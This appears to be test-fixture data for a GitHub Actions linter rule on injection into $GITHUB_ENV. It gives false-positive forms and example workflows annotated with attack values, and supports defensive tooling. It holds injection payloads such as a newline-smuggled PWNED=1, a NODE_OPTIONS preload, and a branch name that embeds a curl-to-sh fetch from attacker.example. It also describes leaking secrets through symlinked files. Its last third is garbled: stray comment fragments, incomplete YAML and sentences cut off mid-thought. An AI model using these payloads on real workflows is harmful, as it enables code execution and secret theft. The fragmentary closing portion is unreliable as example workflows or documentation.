notes.situation: a job calls the reusable workflow .github/workflows/w.yml of the repository example-org/envvar-injection-unknown, whose content is the workflow of the true positive controlled (controlled.custom-shell.yml) of the rule, with on: workflow_call in place of the on of controlled.custom-shell.yml. The linter asked the fact workflow.definition for the reusable workflow and got no answer.
notes.reason: what the jobs of the reusable workflow do is in the file that the linter could not read; whoever changes the uses, such as the author of a pull request, can name a reusable workflow that the token that the linter uses cannot read.
notes.attack_run_behavior: BODY holds x, a line break and PWNED=1, so echo appends the two lines body=x and PWNED=1 to $GITHUB_ENV; the runner reads each line as NAME=value and sets body to x and PWNED to 1 for the later steps.

false_positive_forms.text: gollum in a repository whose wiki is off or that only collaborators may edit

examples.name: wiki-closed.yml
examples.text:
# situation: the job runs on gollum and reads the title of a wiki page.
# reason: the wiki is off, or only collaborators may edit it (GitHub's
#   default), so no outsider writes the title of a page.
# cause: unless a file of facts or --fact says that not anyone may edit the
#   wiki (repo.wiki-open false), the rule reports the finding. When no source
#   answers repo.wiki-open, the finding is conditional.
# attack-value: github.event.pages[0].title = "x\nPWNED=1"
# attack-run-behavior: V holds x, a line break and PWNED=1, so echo appends
#   v=x and PWNED=1 to $GITHUB_ENV, and the runner sets v to x and PWNED to
#   1; with the wiki off or closed to outsiders, only a collaborator writes
#   a title so.
on: gollum
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.pages[0].title }}
        run: echo "v=$V" >> "$GITHUB_ENV"

facts.reason: the example does not answer it

notes.situation: the job runs on gollum and reads the title of a wiki page.
notes.reason: the wiki is off, or only collaborators may edit it (GitHub's default), so no outsider writes the title of a page.
notes.cause: unless a file of facts or --fact says that not anyone may edit the wiki (repo.wiki-open false), the rule reports the finding. When no source answers repo.wiki-open, the finding is conditional.
notes.attack_run_behavior: V holds x, a line break and PWNED=1, so echo appends v=x and PWNED=1 to $GITHUB_ENV, and the runner sets v to x and PWNED to 1; with the wiki off or closed to outsiders, only a collaborator writes a title so.

false_positive_forms.text: a string only those who can write to the repository, or moderate or administer its organization, set, which the webhook schema leaves free and the table reads as arbitrary, such as the name of a label (https://docs.github.com/en/issues/using-labels-and-milestones-to-track-work/managing-labels), the reason a comment is hidden (https://docs.github.com/en/communities/moderating-comments-and-conversations/managing-disruptive-comments), the name of an issue field or of its option (https://docs.github.com/en/issues/tracking-your-work-with-issues/using-issues/managing-issue-fields-in-your-organization)

examples.name: writer-string.yml
examples.text:
# situation: on issues labeled, a run writes the label's name to
#   $GITHUB_ENV.
# reason: only those who can write to the repository create a label, so its
#   name is no attacker's.
# cause: the webhook schema gives the name no enum, and the table reads a
#   free string as arbitrary.
# attack-value: github.event.label.name = "x\nPWNED=1"
# attack-run-behavior: no attacker can name a label; were the name the
#   value, the script would append LABEL=x and PWNED=1 to $GITHUB_ENV, and
#   the runner would set PWNED to 1.
on: {issues: {types: [labeled]}}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo "LABEL=${{ github.event.label.name }}" >> "$GITHUB_ENV"

notes.situation: on issues labeled, a run writes the label's name to $GITHUB_ENV.
notes.reason: only those who can write to the repository create a label, so its name is no attacker's.
notes.cause: the webhook schema gives the name no enum, and the table reads a free string as arbitrary.
notes.attack_run_behavior: no attacker can name a label; were the name the value, the script would append LABEL=x and PWNED=1 to $GITHUB_ENV, and the runner would set PWNED to 1.

false_positive_forms.text: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('[...]'), value)), where each string has only ASCII letters, digits, spaces, -, _, . and /, does not start with -, and has no - right after a space, where the rule reports the value although the if limits the value to those strings, because the rule does not read the if in one of three forms. (1) A reusable workflow or a composite action gets the value through an input, and the if of the calling job or the calling step compares the value. The rule reports the value in the file of the reusable workflow or the composite action. The value is harmless when the if of every caller of that file, inside and outside the repository, compares the value. (2) The if compares the value under one name, and the script writes the value under another name: for example, the if compares env.BODY, which the env of the step sets to ${{ github.event.comment.body }}, and the script writes ${{ github.event.comment.body }}; or the if compares ${{ github.head_ref }}, and the script writes ${{ github.event.pull_request.head.ref }}. The value is harmless when the two names hold the same value in the step; the rule does not check that the two names hold the same value. (3) The if of a step that uses an action compares a value that the with or the env of the same step holds. At the start of the job, the runner runs the pre step of each action from another repository whose action.yml has runs.pre, under the condition runs.pre-if of that action.yml and not under the if of the step. For the pre step, the runner evaluates the with and the env of the step, and the code of the pre step may read the inputs. The runner runs no pre step of a local action (./). The value is harmless when the action has no pre step, or when the code of the pre step does not read the value. In each form, the value is harmless only where the case of the letters does not change what the value names (the undetected form if-compared)

examples.name: if-unnarrowed.yml
examples.text:
# situation: on issue_comment created, a step that has the comment's body in
#   env.BODY runs only when env.BODY is deploy, and the step writes
#   ${{ github.event.comment.body }} as the value, the part of a line of
#   $GITHUB_ENV after the =.
# reason: the step's if compares env.BODY, which holds the comment's body,
#   with deploy, so in the step the body is deploy, ignoring the case of its
#   letters: the body has no character that the shell reads as code, no
#   line break, no word that starts with - and no workflow command.
# cause: the rule limits a value by an if only under the name that the if
#   compares: the if compares env.BODY, and the script writes
#   ${{ github.event.comment.body }}; the rule does not check that env.BODY
#   holds the comment's body.
# attack-value: github.event.comment.body = "x\nPWNED=1"
# attack-run-behavior: on GitHub, the step's if is false for such a body,
#   and the runner skips the step.
on:
  issue_comment:
    types: [created]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - if: env.BODY == 'deploy'
        env:
          BODY: ${{ github.event.comment.body }}
        run: echo "V=${{ github.event.comment.body }}" >> "$GITHUB_ENV"

notes.situation: on issue_comment created, a step that has the comment's body in env.BODY runs only when env.BODY is deploy, and the step writes ${{ github.event.comment.body }} as the value, the part of a line of $GITHUB_ENV after the =.
notes.reason: the step's if compares env.BODY, which holds the comment's body, with deploy, so in the step the body is deploy, ignoring the case of its letters: the body has no character that the shell reads as code, no line break, no word that starts with - and no workflow command.
notes.cause: the rule limits a value by an if only under the name that the if compares: the if compares env.BODY, and the script writes ${{ github.event.comment.body }}; the rule does not check that env.BODY holds the comment's body.
notes.attack_run_behavior: on GitHub, the step's if is false for such a body, and the runner skips the step.

false_positive_forms.text: a job on pull_request_review or pull_request_review_comment whose if: condition lets the job run only when the head repository of the pull request is a fork, such as a job whose if: condition is github.event.pull_request.head.repo.fork: on a pull request from a branch of the repository, the head repository is the repository itself, so in a repository that is not a fork the job runs only for a review of a pull request from a fork. The run of a review of a pull request from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (the undetected form fork-review). The rule does not read whether the repository that runs the workflow (not the head repository of the pull request) is a fork, and reports the job as if the job ran for a review of a pull request from a branch of the repository

examples.name: fork-flag-review.yml
examples.text:
# situation: on comments on the diff, a step writes the comment's body to
#   $GITHUB_ENV, in a job that runs only when the head repository of the
#   pull request is a fork.
# reason: the job runs only when the head repository of the pull request
#   is a fork. On a pull request from a branch of the repository, the head
#   repository is the repository itself, so in a repository that is not a
#   fork the job runs only for a review of a pull request from a fork. In
#   a public repository, the run of such a review has no secrets and a
#   token that only reads; in a private repository, the run has neither
#   secrets nor a token that writes unless the repository gives secrets or
#   a token that writes to the runs of pull requests from forks (the
#   undetected form fork-review).
# cause: the rule does not read whether the repository that runs the
#   workflow (not the head repository of the pull request) is a fork, and
#   reads the job as if the job ran for a review of a pull request from a
#   branch of the repository.
# attack-value: github.event.comment.body = "x\nNODE_OPTIONS=--require=/tmp/PWNED.js"
# attack-run-behavior: in a public repository that is not a fork, a review
#   of a pull request from a branch of the repository does not start the
#   job, as the head repository of such a pull request is the repository
#   itself; a review of a pull request from a fork starts the job with no
#   secrets and a token that only reads, so the value reaches no secret
#   and no token that writes.
on: pull_request_review_comment
jobs:
  a:
    if: github.event.pull_request.head.repo.fork
    runs-on: ubuntu-latest
    steps:
      - env:
          B: ${{ github.event.comment.body }}
        run: echo "body=$B" >> "$GITHUB_ENV"

notes.situation: on comments on the diff, a step writes the comment's body to $GITHUB_ENV, in a job that runs only when the head repository of the pull request is a fork.
notes.reason: the job runs only when the head repository of the pull request is a fork. On a pull request from a branch of the repository, the head repository is the repository itself, so in a repository that is not a fork the job runs only for a review of a pull request from a fork. In a public repository, the run of such a review has no secrets and a token that only reads; in a private repository, the run has neither secrets nor a token that writes unless the repository gives secrets or a token that writes to the runs of pull requests from forks (the undetected form fork-review).
notes.cause: the rule does not read whether the repository that runs the workflow (not the head repository of the pull request) is a fork, and reads the job as if the job ran for a review of a pull request from a branch of the repository.
notes.attack_run_behavior: in a public repository that is not a fork, a review of a pull request from a branch of the repository does not start the job, as the head repository of such a pull request is the repository itself; a review of a pull request from a fork starts the job with no secrets and a token that only reads, so the value reaches no secret and no token that writes.

false_positive_forms.text: a ${{ }} written in a $( ) whose tr takes out the line breaks: the whole substitution is read as the attacker's value

examples.name: tr-in-substitution.yml
examples.text:
# situation: the step writes the body of an issue to an environment file through
#   a $( ) in which tr takes out the line breaks of the body.
# reason: tr takes out the line breaks of the body before it is written.
# cause: the ${{ }} is written in the $( ) itself, which the rule reads as
#   the attacker's value whole (code-injection reports the ${{ }}).
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: the script becomes echo "v=$(echo "x<line
#   break>PWNED=1" | tr -d '\n')" >> "$GITHUB_ENV"; tr takes out the line
#   break, so echo appends the one line v=xPWNED=1, and the runner sets v to
#   xPWNED=1, and no variable PWNED.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo "v=$(echo "${{ github.event.issue.body }}" | tr -d '\n')" >> "$GITHUB_ENV"

notes.situation: the step writes the body of an issue to an environment file through a $( ) in which tr takes out the line breaks of the body.
notes.reason: tr takes out the line breaks of the body before it is written.
notes.cause: the ${{ }} is written in the $( ) itself, which the rule reads as the attacker's value whole (code-injection reports the ${{ }}).
notes.attack_run_behavior: the script becomes echo "v=$(echo "x<line break>PWNED=1" | tr -d '\n')" >> "$GITHUB_ENV"; tr takes out the line break, so echo appends the one line v=xPWNED=1, and the runner sets v to xPWNED=1, and no variable PWNED.

false_positive_forms.text: a heredoc delimiter the author made random, such as D=$(uuidgen): the rule reads only its own fix's form as random

examples.name: own-random-delimiter.yml
examples.text:
# situation: the step writes the body to an environment file in a heredoc
#   whose delimiter the author made random.
# reason: the delimiter of the heredoc is random, which no one can guess.
# cause: the rule reads a delimiter as random only when the delimiter is a
#   variable that the assignment of the fix of the rule sets (ghadelimiter_
#   and 16 bytes of /dev/urandom in hex); a delimiter from uuidgen is not read
#   as random.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: D is a UUID uuidgen makes in the run, so the lines
#   appended to $GITHUB_ENV are v<<D, x, PWNED=1 and D; the runner reads
#   them as one value up to the line D and sets v to x, a line break and
#   PWNED=1, and no variable PWNED.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.body }}
        run: |
          D=$(uuidgen)
          echo "v<<$D" >> "$GITHUB_ENV"
          echo "$V" >> "$GITHUB_ENV"
          echo "$D" >> "$GITHUB_ENV"

notes.situation: the step writes the body to an environment file in a heredoc whose delimiter the author made random.
notes.reason: the delimiter of the heredoc is random, which no one can guess.
notes.cause: the rule reads a delimiter as random only when the delimiter is a variable that the assignment of the fix of the rule sets (ghadelimiter_ and 16 bytes of /dev/urandom in hex); a delimiter from uuidgen is not read as random.
notes.attack_run_behavior: D is a UUID uuidgen makes in the run, so the lines appended to $GITHUB_ENV are v<<D, x, PWNED=1 and D; the runner reads them as one value up to the line D and sets v to x, a line break and PWNED=1, and no variable PWNED.

false_positive_forms.text: an assignment in a branch of if, after && or ||, in the body of a loop, or in the body of a function called there, that bash does not run (if false; then s=$KEY; fi): the rule does not read the value of a condition, so the rule reads the assignment as one that may run, and reads the variable as one that may hold the value of the assignment

examples.name: branch-not-run.yml
examples.text:
# situation: on issues opened, a step sets out to $GITHUB_ENV in an if whose
#   condition is false, writes V= and the issue's body to "$out", and goes
#   on when the write fails (|| true).
# reason: bash does not run the branch, so out is empty when echo runs, and
#   the body does not go to $GITHUB_ENV.
# cause: the rule does not read the value of the condition of an if, and
#   reads the assignment in the branch as one that may run.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: bash cannot open the file of the empty name and
#   writes nothing, || true keeps the step going, and the runner sets no
#   environment variable.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.body }}
        run: |
          if false; then out=$GITHUB_ENV; fi
          echo "V=$V" >> "$out" || true

notes.situation: on issues opened, a step sets out to $GITHUB_ENV in an if whose condition is false, writes V= and the issue's body to "$out", and goes on when the write fails (|| true).
notes.reason: bash does not run the branch, so out is empty when echo runs, and the body does not go to $GITHUB_ENV.
notes.cause: the rule does not read the value of the condition of an if, and reads the assignment in the branch as one that may run.
notes.attack_run_behavior: bash cannot open the file of the empty name and writes nothing, || true keeps the step going, and the runner sets no environment variable.

false_positive_forms.text: a variable of env that the script sets again, before the script writes the variable to $GITHUB_ENV, by an assignment that bash runs each time the script reaches the write, in the same shell as the write (not in a subshell, a $( ) or a command of a pipeline, not before a command name, and not as local in a shell function), and whose value holds nothing of the variable of env (X=safe; echo "A=$X" >> "$GITHUB_ENV"): at the write the variable holds the value of the assignment, and the rule still reads the variable as holding the value of env

examples.name: reassigned-variable.yml
examples.text:
# situation: on issues opened, the step's env sets V to the issue's body,
#   and the script sets V to safe before the script writes V= and "$V" to
#   $GITHUB_ENV.
# reason: the script writes V=safe, the value that the script sets, not the
#   issue's body.
# cause: the rule reads $V as the value of env, and does not read the
#   assignment in the script before the write.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: V is safe when echo runs, so the runner sets V to
#   safe and sets no variable PWNED.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.body }}
        run: |
          V=safe
          echo "V=$V" >> "$GITHUB_ENV"

notes.situation: on issues opened, the step's env sets V to the issue's body, and the script sets V to safe before the script writes V= and "$V" to $GITHUB_ENV.
notes.reason: the script writes V=safe, the value that the script sets, not the issue's body.
notes.cause: the rule reads $V as the value of env, and does not read the assignment in the script before the write.
notes.attack_run_behavior: V is safe when echo runs, so the runner sets V to safe and sets no variable PWNED.

false_positive_forms.text: a write to $GITHUB_ENV by a command that the script runs in the background (&) with no wait for the command, where the command writes after the shell of the script ends (for example: (sleep 5; echo "A=$X" >> "$GITHUB_ENV") &): a write that the command makes after the shell of the script ends does not reach the steps after the step; the rule reads the write as a write that reaches $GITHUB_ENV, because whether the command writes before the shell of the script ends depends on how long the commands take when the step runs

examples.name: background-write.yml
examples.text:
# situation: on issues opened, a step runs in the background (&), with no
#   wait, a subshell that sleeps 5 seconds and then writes V= and the
#   issue's body to $GITHUB_ENV; the shell of the script ends before the
#   write.
# reason: a write that the background command makes after the shell of the
#   script ends does not reach the steps after the step (seen on the runner
#   on 2026-11-17), so the body sets no variable.
# cause: the rule reads the write in the background as a write that reaches
#   $GITHUB_ENV, and does not read when the background command writes.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: the runner sets neither V nor PWNED for the steps
#   after the step.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.body }}
        run: |
          (sleep 5; echo "V=$V" >> "$GITHUB_ENV") &
      - run: printenv V || true

notes.situation: on issues opened, a step runs in the background (&), with no wait, a subshell that sleeps 5 seconds and then writes V= and the issue's body to $GITHUB_ENV; the shell of the script ends before the write.
notes.reason: a write that the background command makes after the shell of the script ends does not reach the steps after the step (seen on the runner on 2026-11-17), so the body sets no variable.
notes.cause: the rule reads the write in the background as a write that reaches $GITHUB_ENV, and does not read when the background command writes.
notes.attack_run_behavior: the runner sets neither V nor PWNED for the steps after the step.

false_positive_forms.text: a reusable workflow or a composite action when all of the following are true: the rule does not know all of the callers of the reusable workflow or the composite action; every workflow that runs the reusable workflow or the composite action (directly, or through another reusable workflow or composite action) is a workflow in the same repository; and the rule would report no finding of the finding kind if the rule read the reusable workflow or the composite action only on the events on which the workflows in the same repository run the reusable workflow or the composite action (for example, every workflow that runs the reusable workflow or the composite action runs only on push). When the rule does not know all of the callers, the rule can read the reusable workflow or the composite action on every event (the worst case). For example, the rule does not know all of the callers when no caller is among the inputs; when the inputs are not the whole repository; for a composite action, when an input is excluded or cannot be read; when a caller names the reusable workflow or the composite action by a name of the form owner/repo/path@ref instead of by a ./ path, in which owner/repo is the repository that the --repo flag names, or is any repository when no --repo flag is given; when a step names the composite action by a ./ path, and either no checkout step runs before that step or the last checkout step before that step is not a plain checkout step (a plain checkout step has no ref input, no repository input and no path input); when a step inside a composite action names another composite action by a ./ path; or when the rule does not know all of the callers of a caller

examples.name: callee.yml
examples.text:
# situation: a reusable workflow that reads the title of an issue, and that
#   only the repository's own workflows call, all of them on push.
# reason: the issue it reads is never an outsider's.
# cause: a callee is read in the worst case, as if a caller ran on issues.
# attack-value: github.event.issue.title = "x\nPWNED=1"
# attack-run-behavior: called by the repository's workflows on push, the
#   event has no issue, so V is empty and echo appends the one line v= to
#   $GITHUB_ENV. Were the title this value (a caller on issues), echo would
#   append v=x and PWNED=1, and the runner would set PWNED to 1.
on: workflow_call
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.title }}
        run: echo "v=$V" >> "$GITHUB_ENV"

notes.situation: a reusable workflow that reads the title of an issue, and that only the repository's own workflows call, all of them on push.
notes.reason: the issue it reads is never an outsider's.
notes.cause: a callee is read in the worst case, as if a caller ran on issues.
notes.attack_run_behavior: called by the repository's workflows on push, the event has no issue, so V is empty and echo appends the one line v= to $GITHUB_ENV. Were the title this value (a caller on issues), echo would append v=x and PWNED=1, and the runner would set PWNED to 1.

examples.name: .github/workflows/called.yml
examples.text:
# situation: ci.yml of the repository o/r calls this reusable workflow on
#   push only, by the name o/r/.github/workflows/called.yml@main, not by the
#   path ./.github/workflows/called.yml.
# reason: when the run of the linter names the repository (--repo o/r), the
#   call by the name is a call of this file, and the only caller runs on
#   push, which no attacker of the finding kind triggers. A run without
#   --repo reads the call by the name o/r/.github/workflows/called.yml@main
#   as a call that may name a file of the repository, because the run does
#   not know which repository the inputs are; the rule does not resolve the
#   call to this file, so the rule reads this file on every event and reports
#   the same finding.
# cause: the rule does not resolve a call by the name of the repository to
#   the file, so the rule reads this workflow on every event.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: only a push to the repository runs ci.yml, which
#   calls this workflow on push; the run of the push reads no value of the
#   attacker's issue, pull request or comment.
on:
  workflow_call:
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          BODY: ${{ github.event.issue.body }}
        run: echo "body=$BODY" >> "$GITHUB_ENV"

others.name: .github/workflows/ci.yml
others.text:
on: push

  call:
    uses: o/r/.github/workflows/called.yml@main
    secrets: inherit

notes.reason: when the run of the linter names the repository (--repo o/r), the call by the name is a call of this file, and the only caller runs on push, which no attacker of the finding kind triggers. A run without --repo reads the call by the name o/r/.github/workflows/called.yml@main as a call that may name a file of the repository, because the run does not know which repository the inputs are; the rule does not resolve the call to this file, so the rule reads this file on every event and reports the same finding.
notes.cause: the rule does not resolve a call by the name of the repository to the file, so the rule reads this workflow on every event.
notes.attack_run_behavior: only a push to the repository runs ci.yml, which calls this workflow on push; the run of the push reads no value of the attacker's issue, pull request or comment.

false_positive_forms.text: a run that the Actions policies of the repository block, in four cases where the rule does not take the policies into account. First, an event policy that blocks an event of the attackers other than pull_request_target (such as issue_comment) in a workflow whose on has that event: the rules ask a fact only for pull_request_target. Second, an actor rule that does not allow the account of the attacker (for example, an actor rule that allows only the repository roles with write access): repo.pull-request-target-allowed is one value for all the runs of a workflow file on pull_request_target, and an actor rule blocks a run by the account that starts the run, so the fact cannot tell what an actor rule blocks. Third, a workflow whose on has pull_request_target and another event: the rule does not ask repo.pull-request-target-allowed for such a workflow, because a run on the other event can reach the job. When the if of the job is false on the other event, so that the job runs only on pull_request_target, and a policy blocks pull_request_target, the finding is a false positive. Fourth, a reusable workflow (on workflow_call) or an action that only workflows on pull_request_target call: the rule asks repo.pull-request-target-allowed only of a workflow whose on has pull_request_target, not of the reusable workflow or the action, so a finding in the reusable workflow or the action is still reported when the policies block the runs of every caller

In two cases, the rule does not ask these facts, and reports the finding whatever the values of the facts are. First, a workflow whose on has an event other than status, check_suite and check_run: the rule decides whether to ask the facts from the events of on alone, and does not read the if of the job, so the rule does not ask the facts even when the if of the job lets the job run only on status, check_suite or check_run. Second, a reusable workflow (on workflow_call) or an action (an action has no on) that only workflows on status, check_suite or check_run call: the rule asks the facts only of a workflow whose on has only events among these three, not of the reusable workflow or the action, so the rule reports a finding in the reusable workflow or the action whatever the values of the facts are

#   for a commit whose message an attacker writes in the repository: no app
#   makes one for a commit of a pull request from a fork

#   the merge of a pull request puts in a branch

false_positive_forms.text: a job that runs only for a pull request from a fork (pull_request, pull_request_review or pull_request_review_comment, with an if that compares github.event.pull_request.head.repo.fork with true, or github.event.pull_request.head.repo.full_name with github.repository), in a repository that is not a fork, in a run of the linter that adds variables-writer or secrets-writer: the rule reads each value of vars and secrets as a value that the attacker writes in every workflow run of the event; the workflow run for a pull request from a fork has no secret except GITHUB_TOKEN and a GITHUB_TOKEN that only reads, unless the settings of a private repository send secrets or a GITHUB_TOKEN that writes to such workflow runs (the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens), and the attacker who writes a variable or a secret gets nothing from the job that the author of the pull request does not get from the code of the pull request. A job with no such if, in a repository where every pull request comes from a fork, is a false positive in the same way. The linter does not tell a workflow run for a pull request from a fork from a workflow run for a pull request from a branch of the repository. A fix: the linter splits the workflow runs of the three events into the runs for a pull request from a fork and the runs for a pull request from a branch of the repository, reads the comparisons of the if with the fork in each, and counts a run for a pull request from a fork only when the facts repo.fork-pr-secrets or repo.fork-pr-write-tokens say that the run gets secrets or a GITHUB_TOKEN that writes. A job with no such if keeps the runs for a pull request from a branch of the repository, and the finding stays. A fact of the rulesets of the repository (a ruleset with the rule Restrict creations on every branch and no actor that may bypass the ruleset) could say that no new branch, and so no pull request from a new branch, can be made, and remove a part of the false positives of a job with no such if; the actors that may bypass a ruleset, the branches made before the ruleset and the names of branches outside the patterns of the ruleset remain. The fix is not observed on GitHub

#   GitHub rates critical, says steam-workshop-deploy before 2.0.0 puts the .git
#   directory, with the credential in .git/config, in the item it publishes.
#   Both are in the code of the action, which the workflow does not show.
# attack: the author of a pull request from a fork names the head branch of
#   the pull request a$(curl${IFS}-sSf${IFS}https://attacker.example/x|sh) and

# advisory: https://github.com/advisories/GHSA-2qvg-qr73-mqxp

#   beside the Compose file, and runs tmatens/compose-lint pinned to the
#   commits of v0.24.0 with sarif-file at the root of the workspace, of
#   v0.31.0 with sarif-file in a subdirectory, and of v0.32.0. The
#   advisories name no workflow; the steps follow the configurations that
#   the advisories describe: a workflow that writes secrets into the .env
#   file beside the Compose file and runs on pull requests from authors who

#   input sarif-file that names a file in a subdirectory
#   (GHSA-xcf7-88g6-7xr8). On pull_request, the author of a pull request from
#   a fork can change the workflow, and the job gets no secret, so the
#   example runs on pull_request_target. The rule also reports
#   GHSA-6f4g-xm8v-pgv6, which GitHub rates medium, on the step of v0.24.0;
#   the example of GHSA-6f4g-xm8v-pgv6 is
#   advisory-medium.ghsa-6f4g-xm8v-pgv6. The fix of the rule upgrades each
#   of the three steps to the commit of v0.33.0. For the step of v0.32.0,
#   0.33.0 is the first patched version of GHSA-rm8w-w798-g545. For the
#   steps of v0.24.0 and of v0.31.0, the greatest first patched version of
#   the advisories of the steps is 0.32.0, which is in the range of
#   GHSA-rm8w-w798-g545, so the fix moves on to 0.33.0, which is in the
#   range of no advisory of the package.
# reason: the six advisories, which GitHub rates low, are in the code of the
#   action, which the workflow does not show. GHSA-jf3h-8jvx-vcrg says
#   compose-lint from 0.22.0 to 0.31.0 quotes the value that a variable of
#   the .env file gives to image: in the text of a finding, and
#   GHSA-rm8w-w798-g545 says compose-lint 0.32.0 does so in a run that stops
#   at 20,000 findings. GHSA-6wcv-rj3c-mhv3 says compose-lint from 0.22.0 to
#   0.30.0 reads a .env file that is a symlink to a file outside the project,
#   such as /proc/self/environ. GHSA-whr6-fgpq-fpv9 (up to 0.24.0) and

#   processing of workflow commands on.
# attack: two pull requests from a fork. The first pull request changes the
#   image of a service of the Compose file to "${DB_PASSWORD}" and commits
#   .compose-lint.yml as a symlink to a file of credentials on the runner,
#   against the step of v0.24.0. The second pull request commits the

#   as a symlink to a directory whose name holds a line break and a workflow
#   command; the directory that the symlink names holds a regular file named
#   reports, so the directory out/reports cannot be created. The second pull
#   request is against the step of v0.31.0.
# attack-run-behavior: in the run of the first pull request, compose-lint
#   v0.24.0 quotes the value of DB_PASSWORD and a part of a line of the file
#   of credentials in the SARIF that the action uploads to Code Scanning. In
#   the run of the second pull request, the action v0.31.0 fails to create
#   the directory of sarif-file, prints the name of the directory before the
#   step ends, and the runner reads the second line of the name as a
#   workflow command.
# advisory: https://github.com/advisories/GHSA-xcf7-88g6-7xr8
# advisory: https://github.com/advisories/GHSA-rm8w-w798-g545
# advisory: https://github.com/advisories/GHSA-whr6-fgpq-fpv9
# advisory: https://github.com/advisories/GHSA-88f4-frh5-gmcr
# advisory: https://github.com/advisories/GHSA-jf3h-8jvx-vcrg
# advisory: https://github.com/advisories/GHSA-6wcv-rj3c-mhv3
on: pull_request_target
jobs:
  lint:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: printf 'DB_PASSWORD=%s\n' "$DB_PASSWORD" > .env
        env:
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
      - uses: tmatens/compose-lint@d6e1817352200adbd0a72893fd7ea7880874759b # v0.24.0
        with:
          sarif-file: results.sarif
      - uses: tmatens/compose-lint@a6a7a76736de1c72abfa96c41ff8af556ffdc55f # v0.31.0
        with:
          sarif-file: out/reports/results.sarif
      - uses: tmatens/compose-lint@2d42617e4c6416f797bbfc6a057950131fa02df3 # v0.32.0

# situation: a job installs kubectl with Azure/setup-kubectl pinned to the
#   commit of v2.1, runs npm ci and the tests, and then kubectl with a

      - run: npm ci && npm test
      - run: kubectl apply -f deploy.yaml

          KUBECONFIG_DATA: ${{ secrets.KUBECONFIG }}

true_negatives.name: advisory-unknown.never-runs.yml
true_negatives.text:
# situation: on push, the job whose id is disabled has if: false, and the job
#   whose id is on-failure needs the job build and has if: needs.build.result
#   == 'failure'; each of the two jobs uses example-org/example-action pinned
#   to the commit of v1.0.0, which an advisory says is vulnerable; GitHub has
#   not rated the advisory (the repository, the commits of the repository and
#   the advisory are made up for this example, as in the true positive
#   advisory-unknown).
# reason: GitHub skips the job disabled because the if of the job disabled is
#   false. The if of the job on-failure calls no status function, so GitHub
#   evaluates the if of the job on-failure only when the job build succeeded;
#   needs.build.result is then success, and the if is false. When the job
#   build fails or is skipped, GitHub skips the job on-failure without
#   evaluating the if. So neither job runs
#   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-conditions-to-control-job-execution.md).
# attack: someone uses the vulnerability that the advisory describes.
# attack-run-behavior: GitHub skips the job disabled and the job on-failure,
#   so the vulnerable code of v1.0.0 does not run.
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo built
  disabled:
    if: false
    runs-on: ubuntu-latest
    steps:
      - uses: example-org/example-action@1111111111111111111111111111111111111111 # v1.0.0
  on-failure:
    needs: build
    if: needs.build.result == 'failure'
    runs-on: ubuntu-latest
    steps:
      - uses: example-org/example-action@1111111111111111111111111111111111111111 # v1.0.0

notes.situation: on push, the job whose id is disabled has if: false, and the job whose id is on-failure needs the job build and has if: needs.build.result == 'failure'; each of the two jobs uses example-org/example-action pinned to the commit of v1.0.0, which an advisory says is vulnerable; GitHub has not rated the advisory (the repository, the commits of the repository and the advisory are made up for this example, as in the true positive advisory-unknown).
notes.reason: GitHub skips the job disabled because the if of the job disabled is false. The if of the job on-failure calls no status function, so GitHub evaluates the if of the job on-failure only when the job build succeeded; needs.build.result is then success, and the if is false. When the job build fails or is skipped, GitHub skips the job on-failure without evaluating the if. So neither job runs (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-conditions-to-control-job-execution.md).
notes.attack: someone uses the vulnerability that the advisory describes.
notes.attack_run_behavior: GitHub skips the job disabled and the job on-failure, so the vulnerable code of v1.0.0 does not run.

#   first step, and the second step runs the save action of that download.

        with:

          key: build

#   request with actions/checkout v4.2.2, writes a secret into the .env file

#   The action tmatens/compose-lint from v0.18.0 installs the version of the
#   compose-lint package that the input whose name is version gives (lines
#   118 to 127 of action.yml at the commit of v0.33.0), so the step installs
#   compose-lint 0.31.0.

#   0.22.0 to 0.31.0), which says compose-lint quotes the value that a
#   variable of the .env file gives to image: in the text of a finding;
#   v0.33.0, the version tag of the action, is in the range of no advisory.
# cause: the rule compares the ranges of the advisories with the version tag
#   of the action, and does not read the code of the action, though the code
#   of the action decides the version of compose-lint that the step
#   installs.
# attack: the author of a pull request from a fork changes the image of a
#   service of the Compose file to "${DB_PASSWORD}".

      - run: printf 'DB_PASSWORD=%s\n' "$DB_PASSWORD" > .env

      - uses: tmatens/compose-lint@691e08bd1881ada886e3f556d0793079e8114451 # v0.33.0
        with:
          version: 0.31.0

